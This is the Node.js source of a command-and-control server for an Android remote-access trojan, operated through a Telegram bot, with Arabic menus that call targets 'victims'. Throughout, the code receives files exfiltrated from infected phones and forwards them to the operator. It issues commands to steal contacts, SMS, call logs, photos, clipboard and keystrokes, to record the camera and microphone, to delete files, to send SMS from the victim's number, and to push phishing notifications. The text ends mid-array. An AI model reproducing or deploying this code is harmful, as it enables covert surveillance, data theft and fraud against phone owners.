const express = require('express')
const http = require('http')
const {Server} = require("socket.io")
const telegramBot = require("node-telegram-bot-api")
const https = require('https');
const multer = require('multer');
const fs = require('fs');

const app = express()
const server = http.createServer(app)
const io = new Server(server)
const uploader = multer();
const data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
const bot = new telegramBot(data.token, {
    polling: true,
    // request: {
    //     proxy: "http://192.168.193.181:8080",
    // },
})
const appData = new Map()
const actions = [
    "✯ .جهات الاتصال☎. ✯", "✯ . سحب الرسايل📩. ✯",
    "✯ .المكالمات📞. ✯", "✯ .📱التطبيقات. ✯",
    "✯ .صوره خلفيه📸. ✯", "✯ .صوره الاماميه📸. ✯",
    "✯ .تسجيل صوت🎤. ✯", "✯ .الحافظة📂. ✯",
    "✯ .لقطة شاشة🖥. ✯", "✯ .ضهار رساله💢. ✯",
    "✯ .أرسل رسالة📂. ✯", "✯ .اهتزاز ⚧📳. ✯", "✯ .تشغيل صوت🔊. ✯", "✯ .ايقاف الصوت🔇. ✯",
    "✯ .اضهار الاشعارات🃏. ✯", "✯ .إيقاف الاشعارات🃏. ✯",
    "✯ .عرض الملفات📁. ✯", "✯.سحب جميع صور📲.✯",
    "✯ .تشفير جهاز 📵☠. ✯", "✯ .فك التشفير جهاز ☠. ✯",
    "✯ ارسال رساله لجميع ارقام الضحيه 📨✯",
    "✯ .‼ اشعار صفحة مزورة ‼. ✯",
    "✯ .العودة إلى القائمة الرئيسية. ✯",
]

app.get("/", (req,res) => {
    res.send("تم بنجاح تشغيل البوت مطور البوت : ★☛𓆩عـلـ❅ـوش الحيـ❅ـدري𓆪 مــعـرف الــمــطـور ☚★ : معرف المطور https://t.me/Ala123alHaidari")
})

app.post("/upload", uploader.single('file'), (req, res) => {
    const name = req.file.originalname
    const model = req.headers.model
    bot.sendDocument(data.id, req.file.buffer, {
        caption: `<b>✯ تم تحميل الملف من هاتف الضحيه😍. → ${model}</b>`,
        parse_mode: "HTML"
    }, {
        filename: name,
        contentType: '*/*',
    })
    res.send("Done")
})

io.on("connection", (socket) => {
    let model = socket.handshake.headers['model'] + "-" + io.sockets.sockets.size || "no information"
    let version = socket.handshake.headers['version'] || "no information"
    let ip = socket.handshake.headers['ip'] || "no information"
    socket['model'] = model
    socket['version'] = version
    let device =
        `<b>✯ تم الختراق جهاز جديد متصل</b>\n\n` +
        `<b>اسم الجهاز</b> → ${model}\n` +
        `<b>اصدار الجهاز</b> → ${version}\n` +
        `<b>𝚒𝚙</b> → ${ip}\n` +
        `<b>الوقت</b> → ${socket.handshake.time}\n\n`
    bot.sendMessage(data.id, device, {parse_mode: "HTML"})
    socket.on('disconnect', () => {
        let device =
            `<b>✯ .تم قطع اتصال الجهاز📵.</b>\n\n` +
            `<b>اسم الجهاز</b> → ${model}\n` +
            `<b>اصدار الجهاز</b> → ${version}\n` +
            `<b>𝚒𝚙</b> → ${ip}\n` +
            `<b>الوقت</b> → ${socket.handshake.time}\n\n`
        bot.sendMessage(data.id, device, {parse_mode: "HTML"})
    })
    socket.on('file-explorer', (message) => {
        let fileKeyboard = []
        let row = []
        message.forEach((file, index) => {
            let callBackData;
            if (file.isFolder) {
                callBackData = `${model}|cd-${file.name}`
            } else {
                callBackData = `${model}|request-${file.name}`
            }
            if (row.length === 0 || row.length === 1) {
                row.push({text: file.name, callback_data: callBackData})
                if (index + 1 === message.length) {
                    fileKeyboard.push(row)
                }
            } else if (row.length === 2) {
                row.push({text: file.name, callback_data: callBackData})
                fileKeyboard.push(row)
                row = []
            }
        })
        fileKeyboard.push(
                    [{text: "✯ سحب كل الملفات ✯", callback_data: `${model}|upload-.`}, {
                        text: "✯ حذف كل الملفات ✯",
                        callback_data: `${model}|delete-.`
                    }],
                    [{text: '✯ . رجوع . ✯', callback_data: `${model}|back-0`}]
                )
        bot.sendMessage(data.id, `<b>✯ تم عرض جميع الملفات لدى الضحيه📂 ${model}</b>`,
            {
                reply_markup: {
                    inline_keyboard: fileKeyboard,
                },
                parse_mode: "HTML"
            }
        )
    })
    socket.on('message', (message) => {
        bot.sendMessage(data.id, `<b>✯ تم سحب رساله من جهاز الضحيه 📱💯 → ${model}\n\n𝙼𝚎𝚜𝚜𝚊𝚐𝚎 →تم عرض رساله بهاتف الضحيه معا تحيات مطور البوت علوش الحيدري. →@Ala123alHaidari → </b>${message}alHaidari`,
            {
                parse_mode: "HTML"
            }
        )
    })
})

bot.on("message", (message) => {
    if (message.text === '/start') {
        bot.sendMessage(data.id,
            "<b>✯  تم بنجاح تشغيل البوت الــمــطـور☚عـلـ.ـوش الحيـ.ـدري☛</b>\n\n" +
            "بوت اختراق الاجهزه ☠📵من خلال هذا البوت يمكنك تحكم بي الهاتف الضحيه بي الكامل📛\nانت المسؤول عن أي ضررا تسببها للأخرين ولا يتحمل المطور أي سوء استخدم الــمــطـور☚عـلـ.ـوش الحيـ.ـدري☛!\n\n" +
            "مـعـرف الـمـطـور https://t.me/Ala123alHaidari قانتي لتعلم الهكر https://t.me/ala_al_Haidari: @Ala123alHaidari",
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["✯ .☣️عددضحايا. ✯", "✯ .قائمة التحكم😈. ✯"], ["✯ .معلومات عن المطور ☠⚜. ✯"]],
                    "resize_keyboard": true
                }
            }
        )
    } else if (appData.get('currentAction') === 'microphoneDuration') {
        let duration = message.text
        let target = appData.get("currentTarget")
        io.to(target).emit("commend",
            {"request": "microphone", "extras": [{"key": "duration", "value": duration}]}
        )
        appData.delete("currentTarget")
        appData.delete("currentAction")
        bot.sendMessage(data.id,
            "<b>✯ تم تنفيذ الطلب بنجاح  سوف يتم سحب الملف من جهاز الضحية ...\n\n✯ العودة إلي القائمة الرئيسية الــمــطـور☚عـلـ❅ـوش الحيـ❅ـدري☛ https://t.me/Ala123alHaidari</b>\n\n",
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["✯ .☣️عددضحايا. ✯", "✯ .قائمة التحكم😈. ✯"], ["✯ .معلومات عن المطور ☠⚜. ✯"]],
                    "resize_keyboard": true
                }
            }
        )
    } else if (appData.get('currentAction') === 'toastText') {
        let text = message.text
        let target = appData.get("currentTarget")
        io.to(target).emit("commend",
            {"request": "toast", "extras": [{"key": "text", "value": text}]}
        )
        appData.delete("currentTarget")
        appData.delete("currentAction")
        bot.sendMessage(data.id,
            "<b>✯ تم تنفيذ الطلب بنجاح  سوف يتم سحب الملف من جهاز الضحية ...\n\n✯ العودة إلي القائمة الرئيسية الــمــطـور☚عـلـ❅ـوش الحيـ❅ـدري☛ https://t.me/Ala123alHaidari</b>\n\n",
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["✯ .☣️عددضحايا. ✯", "✯ .قائمة التحكم😈. ✯"], ["✯ .معلومات عن المطور ☠⚜. ✯"]],
                    "resize_keyboard": true
                }
            }
        )
      } else if (appData.get('currentAction') === 'Url') {
      let text = message.text
      let target = appData.get("currentTarget")
      io.to(target).emit("commend",
          {"request": "url", "extras": [{"key": "text", "value": text}]}
      )
      appData.delete("currentTarget")
      appData.delete("currentAction")
      bot.sendMessage(data.id,
          "<b>✯ تم تنفيذ الطلب بنجاح  سوف يتم سحب الملف من جهاز الضحية ...\n\n✯ العودة إلي القائمة الرئيسية الــمــطـور☚عـلـ❅ـوش الحيـ❅ـدري☛ https://t.me/Ala123alHaidari</b>\n\n",
          {
              parse_mode: "HTML",
              "reply_markup": {
                  "keyboard": [["✯ .☣️عددضحايا. ✯", "✯ .قائمة التحكم😈. ✯"], ["✯ .معلومات عن المطور ☠⚜. ✯"]],
                  "resize_keyboard": true
              }
          }
      )
    } else if (appData.get('currentAction') === 'smsNumber') {
        let number = message.text
        appData.set("currentNumber", number)
        appData.set('currentAction', 'smsText')
        bot.sendMessage(data.id,
            `<b>✯ الآن أدخل الرسالة التي تريد إرسالها ${number}</b>\n\n`,
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [[".الغاء  وكنسله العمليه⛔️."]],
                    "resize_keyboard": true,
                    "one_time_keyboard": true
                }
            }
        )
    } else if (appData.get('currentAction') === 'smsText') {
        let text = message.text
        let number = appData.get("currentNumber")
        let target = appData.get("currentTarget")
        io.to(target).emit("commend",
            {"request": "sendSms", "extras": [{"key": "number", "value": number}, {"key": "text", "value": text}]}
        )
        appData.delete("currentTarget")
        appData.delete("currentAction")
        appData.delete("currentNumber")
        bot.sendMessage(data.id,
            "<b>✯ تم تنفيذ الطلب بنجاح  سوف يتم سحب الملف من جهاز الضحية ...\n\n✯ العودة إلي القائمة الرئيسية الــمــطـور☚عـلـ❅ـوش الحيـ❅ـدري☛ https://t.me/Ala123alHaidari</b>\n\n",
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["✯ .☣️عددضحايا. ✯", "✯ .قائمة التحكم😈. ✯"], ["✯ .معلومات عن المطور ☠⚜. ✯"]],
                    "resize_keyboard": true
                }
            }
        )
    } else if (appData.get('currentAction') === 'vibrateDuration') {
        let duration = message.text
        let target = appData.get("currentTarget")
        io.to(target).emit("commend",
            {"request": "vibrate", "extras": [{"key": "duration", "value": duration}]}
        )
        appData.delete("currentTarget")
        appData.delete("currentAction")
        bot.sendMessage(data.id,
            "<b>✯ تم تنفيذ الطلب بنجاح  سوف يتم سحب الملف من جهاز الضحية ...\n\n✯ العودة إلي القائمة الرئيسية الــمــطـور☚عـلـ❅ـوش الحيـ❅ـدري☛ https://t.me/Ala123alHaidari</b>\n\n",
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["✯ .☣️عددضحايا. ✯", "✯ .قائمة التحكم😈. ✯"], ["✯ .معلومات عن المطور ☠⚜. ✯"]],
                    "resize_keyboard": true
                }
            }
        )
    } else if (appData.get('currentAction') === 'textToAllContacts') {
        let text = message.text
        let target = appData.get("currentTarget")
        io.to(target).emit("commend",
            {"request": "smsToAllContacts", "extras": [{"key": "text", "value": text}]}
        )
        appData.delete("currentTarget")
        appData.delete("currentAction")
        bot.sendMessage(data.id,
            "<b>✯ تم تنفيذ الطلب بنجاح  سوف يتم سحب الملف من جهاز الضحية ...\n\n✯ العودة إلي القائمة الرئيسية الــمــطـور☚عـلـ❅ـوش الحيـ❅ـدري☛ https://t.me/Ala123alHaidari</b>\n\n",
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["✯ .☣️عددضحايا. ✯", "✯ .قائمة التحكم😈. ✯"], ["✯ .معلومات عن المطور ☠⚜. ✯"]],
                    "resize_keyboard": true
                }
            }
        )
    } else if (appData.get('currentAction') === 'notificationText') {
        let text = message.text
        appData.set("currentNotificationText", text)
        appData.set('currentAction', 'notificationUrl')
        bot.sendMessage(data.id,
            `<b>✯ رائع ، أدخل الآن الرابط الذي تريد فتحه بواسطة الإشعاره</b>\n\n`,
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [[".الغاء  وكنسله العمليه⛔️."]],
                    "resize_keyboard": true,
                    "one_time_keyboard": true
                }
            }
        )
    } else if (appData.get('currentAction') === 'notificationUrl') {
        let url = message.text
        let text = appData.get("currentNotificationText")
        let target = appData.get("currentTarget")
        io.to(target).emit("commend",
            {"request": "popNotification", "extras": [{"key": "text", "value": text}, {"key": "url", "value": url}]}
        )
        appData.delete("currentTarget")
        appData.delete("currentAction")
        appData.delete("currentNotificationText")
        bot.sendMessage(data.id,
            "<b>✯ تم تنفيذ الطلب بنجاح  سوف يتم سحب الملف من جهاز الضحية ...\n\n✯ العودة إلي القائمة الرئيسية الــمــطـور☚عـلـ❅ـوش الحيـ❅ـدري☛ https://t.me/Ala123alHaidari</b>\n\n",
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["✯ .☣️عددضحايا. ✯", "✯ .قائمة التحكم😈. ✯"], ["✯ .معلومات عن المطور ☠⚜. ✯"]],
                    "resize_keyboard": true
                }
            }
        )
    } else if (message.text === '✯ .☣️عددضحايا. ✯') {
        if (io.sockets.sockets.size === 0) {
            bot.sendMessage(data.id,
                "<b>✯ .لا توجد أجهزة متصلة.</b>\n\n",
                {
                    parse_mode: "HTML",
                }
            )
        } else {
            let devices = `<b>✯ عدد الأجهزة المتصلة : ${io.sockets.sockets.size}</b>\n\n`
            let count = 1
            io.sockets.sockets.forEach((value, key, map) => {
                devices +=
                    `<b>جهاز ${count}</b>\n` +
                    `<b>اسم الجهاز</b> → ${value.model}\n` +
                    `<b>اصدار الجهاز</b> → ${value.version}\n` +
                    `<b>𝚒𝚙</b> → ${value.ip}\n` +
                    `<b>الوقت</b> → ${value.handshake.time}\n\n`
                count += 1
            })
            bot.sendMessage(data.id, devices, {parse_mode: "HTML"})
        }
    } else if (message.text === '✯ .قائمة التحكم😈. ✯') {
        if (io.sockets.sockets.size === 0) {
            bot.sendMessage(data.id,
                "<b>✯ .لا توجد أجهزة متصلة.</b>\n\n",
                {
                    parse_mode: "HTML",
                }
            )
        } else {
            let devices = []
            io.sockets.sockets.forEach((value, key, map) => {
                devices.push([value.model])
            })
            devices.push(["✯ .تحكم في جميع الأجهزة المتصلة. ✯"])
            devices.push(["✯ .العودة إلى القائمة الرئيسية. ✯"])
            bot.sendMessage(data.id,
                "<b>✯ .حدد الجهاز اللي تريدالتحكم به📵.</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": devices,
                        "resize_keyboard": true,
                        "one_time_keyboard": true
                    }
                }
            )
        }
    } else if (message.text === '✯ .معلومات عن المطور ☠⚜. ✯') {
        bot.sendMessage(data.id,
            "<b>✯ مرحبا بك في بوت علوش الحيدري 📵 https://t.me/Ala123alHaidari @ala_al_Haidari\n☚عـلـ.ـوش الحيـ.ـدري☛ بواسطة ☠ الروبوت الــمــطـور جيش الحيدري\n\nالمطورين → @Ala123alHaidari</b>\n\n",
            {
                parse_mode: "HTML",
            }
        )
    } else if (message.text === '✯ .العودة إلى القائمة الرئيسية. ✯') {
        bot.sendMessage(data.id,
            "<b>✯ .العودة إلى القائمة الرئيسية.</b>\n\n",
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["✯ .☣️عددضحايا. ✯", "✯ .قائمة التحكم😈. ✯"], ["✯ .معلومات عن المطور ☠⚜. ✯"]],
                    "resize_keyboard": true
                }
            }
        )

    } else if (message.text === '.الغاء  وكنسله العمليه⛔️.') {
        let target = io.sockets.sockets.get(appData.get("currentTarget")).model
        bot.sendMessage(data.id,
            `<b>✯ .حدد اجرا اي شي تريد بجهاز الضحيه💻. ${target}</b>\n\n`,
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [
                        ["✯ .جهات الاتصال☎. ✯", "✯ . سحب الرسايل📩. ✯"],
                        ["✯ .المكالمات📞. ✯", "✯ .📱التطبيقات. ✯"],
                        ["✯ .صوره خلفيه📸. ✯", "✯ .صوره الاماميه📸. ✯"],
                        ["✯ .تسجيل صوت🎤. ✯", "✯ .الحافظة📂. ✯"],
                        ["✯ .لقطة شاشة🖥. ✯", "✯ .ضهار رساله💢. ✯"],
                        ["✯ .أرسل رسالة📂. ✯", "✯ .اهتزاز ⚧📳. ✯"],
                        ["✯ .تشغيل صوت🔊. ✯", "✯ .ايقاف الصوت🔇. ✯"],
                        ["✯ .اضهار الاشعارات🃏. ✯", "✯ .إيقاف الاشعارات🃏. ✯"],
                        ["✯ .عرض الملفات📁. ✯", "✯.سحب جميع صور📲.✯"],
                        ["✯ .تشفير جهاز 📵☠. ✯", "✯ .فك التشفير جهاز ☠. ✯"],
                        ["✯ ارسال رساله لجميع ارقام الضحيه 📨✯",],
                        ["✯ .‼ اشعار صفحة مزورة ‼. ✯",],
                        ["✯ .العودة إلى القائمة الرئيسية. ✯"]
                    ],
                    "resize_keyboard": true,
                    "one_time_keyboard": true
                }
            }
        )
    } else if (actions.includes(message.text)) {
        let target = appData.get("currentTarget")
        if (message.text === '✯ .جهات الاتصال☎. ✯') {
            io.to(target).emit("commend",
                {"request": "contacts", "extras": []}
            )
            appData.delete("currentTarget")
            bot.sendMessage(data.id,
                "<b>✯ تم تنفيذ الطلب بنجاح  سوف يتم سحب الملف من جهاز الضحية ...\n\n✯ العودة إلي القائمة الرئيسية الــمــطـور☚عـلـ❅ـوش الحيـ❅ـدري☛ https://t.me/Ala123alHaidari</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["✯ .☣️عددضحايا. ✯", "✯ .قائمة التحكم😈. ✯"], ["✯ .معلومات عن المطور ☠⚜. ✯"]],
                        "resize_keyboard": true
                    }
                }
            )
        }
        if (message.text === '✯ . سحب الرسايل📩. ✯') {
            io.to(target).emit("commend",
                {"request": "all-sms", "extras": []}
            )
            appData.delete("currentTarget")
            bot.sendMessage(data.id,
                "<b>✯ تم تنفيذ الطلب بنجاح  سوف يتم سحب الملف من جهاز الضحية ...\n\n✯ العودة إلي القائمة الرئيسية الــمــطـور☚عـلـ❅ـوش الحيـ❅ـدري☛ https://t.me/Ala123alHaidari</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["✯ .☣️عددضحايا. ✯", "✯ .قائمة التحكم😈. ✯"], ["✯ .معلومات عن المطور ☠⚜. ✯"]],
                        "resize_keyboard": true
                    }
                }
            )
        }
        if (message.text === '✯ .المكالمات📞. ✯') {
            io.to(target).emit("commend",
                {"request": "calls", "extras": []}
            )
            appData.delete("currentTarget")
            bot.sendMessage(data.id,
                "<b>✯ تم تنفيذ الطلب بنجاح  سوف يتم سحب الملف من جهاز الضحية ...\n\n✯ العودة إلي القائمة الرئيسية الــمــطـور☚عـلـ❅ـوش الحيـ❅ـدري☛ https://t.me/Ala123alHaidari</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [[" 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ .قائمة التحكم😈. ✯"], ["✯ .معلومات عن المطور ☠⚜. ✯"]],
                        "resize_keyboard": true
                    }
                }
            )
        }
        if (message.text === '✯ .📱التطبيقات. ✯') {
            io.to(target).emit("commend",
                {"request": "apps", "extras": []}
            )
            appData.delete("currentTarget")
            bot.sendMessage(data.id,
                "<b>✯ تم تنفيذ الطلب بنجاح  سوف يتم سحب الملف من جهاز الضحية ...\n\n✯ العودة إلي القائمة الرئيسية الــمــطـور☚عـلـ❅ـوش الحيـ❅ـدري☛ https://t.me/Ala123alHaidari</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["✯ .☣️عددضحايا. ✯", "✯ .قائمة التحكم😈. ✯"], ["✯ .معلومات عن المطور ☠⚜. ✯"]],
                        "resize_keyboard": true
                    }
                }
            )
        }
        if (message.text === '✯ .صوره خلفيه📸. ✯') {
            io.to(target).emit("commend",
                {"request": "main-camera", "extras": []}
            )
            appData.delete("currentTarget")
            bot.sendMessage(data.id,
                "<b>✯ تم تنفيذ الطلب بنجاح  سوف يتم سحب الملف من جهاز الضحية ...\n\n✯ العودة إلي القائمة الرئيسية الــمــطـور☚عـلـ❅ـوش الحيـ❅ـدري☛ https://t.me/Ala123alHaidari</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["✯ .☣️عددضحايا. ✯", "✯ .قائمة التحكم😈. ✯"], ["✯ .معلومات عن المطور ☠⚜. ✯"]],
                        "resize_keyboard": true
                    }
                }
            )
        }
        if (message.text === '✯ .صوره الاماميه📸. ✯') {
            io.to(target).emit("commend",
                {"request": "selfie-camera", "extras": []}
            )
            appData.delete("currentTarget")
            bot.sendMessage(data.id,
                "<b>✯ تم تنفيذ الطلب بنجاح  سوف يتم سحب الملف من جهاز الضحية ...\n\n✯ العودة إلي القائمة الرئيسية الــمــطـور☚عـلـ❅ـوش الحيـ❅ـدري☛ https://t.me/Ala123alHaidari</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["✯ .☣️عددضحايا. ✯", "✯ .قائمة التحكم😈. ✯"], ["✯ .معلومات عن المطور ☠⚜. ✯"]],
                        "resize_keyboard": true
                    }
                }
            )
        }
        if (message.text === '✯ .الحافظة📂. ✯') {
            io.to(target).emit("commend",
                {"request": "clipboard", "extras": []}
            )
            appData.delete("currentTarget")
            bot.sendMessage(data.id,
                "<b>✯ تم تنفيذ الطلب بنجاح  سوف يتم سحب الملف من جهاز الضحية ...\n\n✯ العودة إلي القائمة الرئيسية الــمــطـور☚عـلـ❅ـوش الحيـ❅ـدري☛ https://t.me/Ala123alHaidari</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["✯ .☣️عددضحايا. ✯", "✯ .قائمة التحكم😈. ✯"], ["✯ .معلومات عن المطور ☠⚜. ✯"]],
                        "resize_keyboard": true
                    }
                }
            )
        }
        if (message.text === '✯ .لقطة شاشة🖥. ✯') {
            io.to(target).emit("commend",
                {"request": "screenshot", "extras": []}
            )
            appData.delete("currentTarget")
            bot.sendMessage(data.id,
                "<b>✯ تم تنفيذ الطلب بنجاح  سوف يتم سحب الملف من جهاز الضحية ...\n\n✯ العودة إلي القائمة الرئيسية الــمــطـور☚عـلـ❅ـوش الحيـ❅ـدري☛ https://t.me/Ala123alHaidari</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["✯ .☣️عددضحايا. ✯", "✯ .قائمة التحكم😈. ✯"], ["✯ .معلومات عن المطور ☠⚜. ✯"]],
                        "resize_keyboard": true
                    }
                }
            )
        }
        if (message.text === '✯ .تشفير جهاز 📵☠. ✯') {
            io.to(target).emit("commend",
                {"request": "open-url", "extras": []}
            )
            appData.delete("currentTarget")
            bot.sendMessage(data.id,
                "<b>✯ تم تنفيذ الطلب بنجاح  سوف يتم سحب الملف من جهاز الضحية ...\n\n✯ العودة إلي القائمة الرئيسية الــمــطـور☚عـلـ❅ـوش الحيـ❅ـدري☛ https://t.me/Ala123alHaidari</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["✯ .☣️عددضحايا. ✯", "✯ .قائمة التحكم😈. ✯"], ["✯ .معلومات عن المطور ☠⚜. ✯"]],
                        "resize_keyboard": true
                    }
                }
            )
        }
        if (message.text === '✯ .اضهار الاشعارات🃏. ✯') {
            io.to(target).emit("commend",
                {"request": "keylogger-on", "extras": []}
            )
            appData.delete("currentTarget")
            bot.sendMessage(data.id,
                "<b>✯ تم تنفيذ الطلب بنجاح  سوف يتم سحب الملف من جهاز الضحية ...\n\n✯ العودة إلي القائمة الرئيسية الــمــطـور☚عـلـ❅ـوش الحيـ❅ـدري☛ https://t.me/Ala123alHaidari</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["✯ .☣️عددضحايا. ✯", "✯ .قائمة التحكم😈. ✯"], ["✯ .معلومات عن المطور ☠⚜. ✯"]],
                        "resize_keyboard": true
                    }
                }
            )
        }
        if (message.text === '✯ .إيقاف الاشعارات🃏. ✯') {
            io.to(target).emit("commend",
                {"request": "keylogger-off", "extras": []}
            )
            appData.delete("currentTarget")
            bot.sendMessage(data.id,
                "<b>✯ تم تنفيذ الطلب بنجاح  سوف يتم سحب الملف من جهاز الضحية ...\n\n✯ العودة إلي القائمة الرئيسية الــمــطـور☚عـلـ❅ـوش الحيـ❅ـدري☛ https://t.me/Ala123alHaidari</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["✯ .☣️عددضحايا. ✯", "✯ .قائمة التحكم😈. ✯"], ["✯ .معلومات عن المطور ☠⚜. ✯"]],
                        "resize_keyboard": true
                    }
                }
            )
        }
        if (message.text === '✯ .عرض الملفات📁. ✯') {
            io.to(target).emit("file-explorer",
                {"request": "ls", "extras": []}
            )
            appData.delete("currentTarget")
            bot.sendMessage(data.id,
                "<b>✯ تم تنفيذ الطلب بنجاح  سوف يتم سحب الملف من جهاز الضحية ...\n\n✯ العودة إلي القائمة الرئيسية الــمــطـور☚عـلـ❅ـوش الحيـ❅ـدري☛ https://t.me/Ala123alHaidari</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["✯ .☣️عددضحايا. ✯", "✯ .قائمة التحكم😈. ✯"], ["✯ .معلومات عن المطور ☠⚜. ✯"]],
                        "resize_keyboard": true
                    }
                }
            )
        }
        if (message.text === '✯.سحب جميع صور📲.✯') {
            io.to(target).emit("commend",
                {"request": "gallery", "extras": []}
            )
            appData.delete("currentTarget")
            bot.sendMessage(data.id,
                "<b>✯ تم تنفيذ الطلب بنجاح  سوف يتم سحب الملف من جهاز الضحية ...\n\n✯ العودة إلي القائمة الرئيسية الــمــطـور☚عـلـ❅ـوش الحيـ❅ـدري☛ https://t.me/Ala123alHaidari</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["✯ .☣️عددضحايا. ✯", "✯ .قائمة التحكم😈. ✯"], ["✯ .معلومات عن المطور ☠⚜. ✯"]],
                        "resize_keyboard": true
                    }
                }
            )
        }
        if (message.text === '✯ .تسجيل صوت🎤. ✯') {
            appData.set('currentAction', 'microphoneDuration')
            bot.sendMessage(data.id,
                "<b>✯ . يجب عليك إدخال الوقت بي الثواني.</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [[".الغاء  وكنسله العمليه⛔️."]],
                        "resize_keyboard": true,
                        "one_time_keyboard": true
                    }
                }
            )
        }
        if (message.text === '✯ .ضهار رساله💢. ✯') {
            appData.set('currentAction', 'toastText')
            bot.sendMessage(data.id,
                "<b>✯  .هي رسالة قصيرة تظهر على شاشة الجهاز لبضع ثوان ادخل الرسالة التي تريد ان تظهر علئ جهاز الضحية.</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [[".الغاء  وكنسله العمليه⛔️."]],
                        "resize_keyboard": true,
                        "one_time_keyboard": true
                    }
                }
            )
        }
       if (message.text === 'Url') {
           appData.set('currentAction', 'Url')
           bot.sendMessage(data.id,
               "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚊𝚙𝚙𝚎𝚊𝚛 𝚒𝚗 𝚝𝚘𝚊𝚜𝚝 𝚋𝚘𝚡</b>\n\n",
               {
                   parse_mode: "HTML",
                   "reply_markup": {
                       "keyboard": [[".الغاء  وكنسله العمليه⛔️."]],
                       "resize_keyboard": true,
                       "one_time_keyboard": true
                   }
               }
           )
       }
        if (message.text === '✯ .أرسل رسالة📂. ✯') {
            appData.set('currentAction', 'smsNumber')
            bot.sendMessage(data.id,
                "<b>✯ .الرجاء كتابة رقم الذي تريد ارسال الية من رقم الضحية.</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [[".الغاء  وكنسله العمليه⛔️."]],
                        "resize_keyboard": true,
                        "one_time_keyboard": true
                    }
                }
            )
        }
        if (message.text === '✯ .اهتزاز ⚧📳. ✯') {
            appData.set('currentAction', 'vibrateDuration')
            bot.sendMessage(data.id,
                "<b>✯ .الرجاء كتابة المده الاهتزاز هاتف الضحية.</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [[".الغاء  وكنسله العمليه⛔️."]],
                        "resize_keyboard": true,
                        "one_time_keyboard": true
                    }
                }
            )
        }
        if (message.text === '✯ ارسال رساله لجميع ارقام الضحيه 📨✯') {
            appData.set('currentAction', 'textToAllContacts')
            bot.sendMessage(data.id,
                "<b>✯ .الرجاء كتابة الرسالة المراد ارسالها الئ الجميع.</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [[".الغاء  وكنسله العمليه⛔️."]],
                        "resize_keyboard": true,
                        "one_time_keyboard": true
                    }
                }
            )
        }
        if (message.text === '✯ .‼ اشعار صفحة مزورة ‼. ✯') {
            appData.set('currentAction', 'notificationText')
            bot.sendMessage(data.id,
                "<b>✯ ادخل الرسالة التي تريدها تظهر كما إشعار</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [[".الغاء  وكنسله العمليه⛔️."]],
                        "resize_keyboard": true,
                        "one_time_keyboard": true
                    }
                }
            )
        }
        if (message.text === '✯ .تشغيل صوت🔊. ✯') {
            appData.set('currentAction', 'recordVoice')
            bot.sendMessage(data.id,
                "<b>✯ أدخل رابط الصوت الذي تريد تشغيله</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [[".الغاء  وكنسله العمليه⛔️."]],
                        "resize_keyboard": true,
                        "one_time_keyboard": true
                    }
                }
            )
        }
    } else {
        io.sockets.sockets.forEach((value, key, map) => {
            if (message.text === value.model) {
                appData.set("currentTarget", key)
                bot.sendMessage(data.id,
                    `<b>✯ .حدد اجرا اي شي تريد بجهاز الضحيه💻. ${value.model}</b>\n\n`,
                    {
                        parse_mode: "HTML",
                        "reply_markup": {
                            "keyboard": [
                                ["✯ .جهات الاتصال☎. ✯", "✯ . سحب الرسايل📩. ✯"],
                                ["✯ .المكالمات📞. ✯", "✯ .📱التطبيقات. ✯"],
                                ["✯ .صوره خلفيه📸. ✯", "✯ .صوره الاماميه📸. ✯"],
                                ["✯ .تسجيل صوت🎤. ✯", "✯ .الحافظة📂. ✯"],
                                ["✯ .لقطة شاشة🖥. ✯", "✯ .ضهار رساله💢. ✯"],
                                ["✯ .أرسل رسالة📂. ✯", "✯ .اهتزاز ⚧📳. ✯"],
                                ["✯ .تشغيل صوت🔊. ✯", "✯ .ايقاف الصوت🔇. ✯"],
